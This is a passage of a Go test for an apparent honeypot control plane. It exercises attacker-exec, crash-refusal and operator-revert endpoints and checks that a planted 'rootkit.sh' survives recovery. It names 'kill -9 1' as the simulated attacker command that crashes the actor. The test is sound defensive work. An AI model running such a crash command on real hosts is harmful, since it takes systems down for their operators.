	if respCrash.StatusCode != http.StatusOK {
		t.Fatalf("POST crash status = %d", respCrash.StatusCode)
	}
	var crashRes GatewayActionResponse
	if err := json.NewDecoder(respCrash.Body).Decode(&crashRes); err != nil {
		t.Fatalf("decode crashRes: %v", err)
	}
	if crashRes.Status != "CRASHED" {
		t.Fatalf("expected actor Status=CRASHED after kill -9 1, got %q", crashRes.Status)
	}
	if crashRes.Shell == nil || crashRes.Shell.ExitCode != 137 {
		t.Fatalf("expected shell exit code 137, got %+v", crashRes.Shell)
	}

	// 3. Subsequent shell command while CRASHED is refused with 409 Conflict (control plane refuses wakeup)
	blockedBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"ls -la"}`
	respBlocked, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(blockedBody))
	if err != nil {
		t.Fatalf("POST blocked exec: %v", err)
	}
	defer respBlocked.Body.Close()
	if respBlocked.StatusCode != http.StatusConflict {
		t.Fatalf("expected 409 Conflict when executing command on CRASHED actor, got %d", respBlocked.StatusCode)
	}
	errBytes, _ := io.ReadAll(respBlocked.Body)
	if !strings.Contains(string(errBytes), "ACTOR_STATE_CRASHED") {
		t.Fatalf("expected ACTOR_STATE_CRASHED message in 409 response, got %q", string(errBytes))
	}

	// 4. Operator runs /api/soc/revert (kubectl ate revert actor) -> resets actor from CRASHED to RUNNING at v2!
	revertBody := `{"actor_name":"honeypot-203-0-113-5","target_version":2}`
	respRev, err := http.Post(srv.URL+"/api/soc/revert", "application/json", strings.NewReader(revertBody))
	if err != nil {
		t.Fatalf("POST /api/soc/revert: %v", err)
	}
	defer respRev.Body.Close()
	var revRes GatewayActionResponse
	if err := json.NewDecoder(respRev.Body).Decode(&revRes); err != nil {
		t.Fatalf("decode revRes: %v", err)
	}
	if revRes.Status != "RUNNING" {
		t.Fatalf("expected Status=RUNNING after revert recovery, got %q", revRes.Status)
	}
	if _, ok := revRes.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh intact after revert from CRASHED")
	}

	// 5. Shell commands succeed again after revert recovery
	afterBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"cat rootkit.sh"}`
	respAfter, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(afterBody))
	if err != nil {
		t.Fatalf("POST after recovery: %v", err)
	}
	defer respAfter.Body.Close()
	if respAfter.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 OK after revert recovery, got %d", respAfter.StatusCode)
	}
}



